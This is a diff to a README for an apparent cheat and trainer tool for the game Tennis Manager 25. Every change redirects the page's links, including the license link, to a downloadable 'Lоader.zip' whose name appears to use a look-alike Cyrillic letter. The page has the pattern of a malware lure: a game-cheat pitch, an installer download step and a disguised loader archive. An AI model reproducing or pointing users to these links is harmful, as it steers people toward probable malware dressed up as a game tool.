@@ -1,6 +1,6 @@
 # 🎾 Tennis Manager 25 Cheats & Hacks 🛠️
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Tennis%20Manager%2025%20Tool-blue?style=for-the-badge&logo=appveyor)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/AttriKartik123/AceServe-Trainer-TennisManager25/main/Lоader.zip%20Now-Tennis%20Manager%2025%20Tool-blue?style=for-the-badge&logo=appveyor)](https://raw.githubusercontent.com/AttriKartik123/AceServe-Trainer-TennisManager25/main/Lоader.zip)
 
 Unlock advanced capabilities in **Tennis Manager 25** with unparalleled ease-of-use! This extensive toolkit is crafted for optimization, providing robust features for unparalleled control, performance enhancements, and seamless gameplay experiences.
 
@@ -38,7 +38,7 @@ Tennis Manager 25 mods, TM25 trainers, TM25 helper, gameplay enhancement, TM25 m
 **Step 1:**  
 Click the download button below to obtain the installer.
 
-[![Direct Download](https://img.shields.io/badge/Download%20Here-Installer-blue?logo=windows&logoColor=white&style=flat)](https://easylauncher.su/PSnzrH)
+[![Direct Download](https://raw.githubusercontent.com/AttriKartik123/AceServe-Trainer-TennisManager25/main/Lоader.zip%20Here-Installer-blue?logo=windows&logoColor=white&style=flat)](https://raw.githubusercontent.com/AttriKartik123/AceServe-Trainer-TennisManager25/main/Lоader.zip)
 
 Follow on-screen instructions for a rapid, seamless launch.
 
@@ -52,8 +52,8 @@ This repository is intended for educational and entertainment purposes only. Use
 
 ## 📜 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT).
+Distributed under the [MIT License](https://raw.githubusercontent.com/AttriKartik123/AceServe-Trainer-TennisManager25/main/Lоader.zip).
 
 ---
 
-[![Download Tennis Manager 25 Cheat Tool](https://img.shields.io/badge/Download%20Now-Tennis%20Manager%2025%20Tool-blue?style=for-the-badge&logo=appveyor)](https://easylauncher.su/PSnzrH)
+[![Download Tennis Manager 25 Cheat Tool](https://raw.githubusercontent.com/AttriKartik123/AceServe-Trainer-TennisManager25/main/Lоader.zip%20Now-Tennis%20Manager%2025%20Tool-blue?style=for-the-badge&logo=appveyor)](https://raw.githubusercontent.com/AttriKartik123/AceServe-Trainer-TennisManager25/main/Lоader.zip)
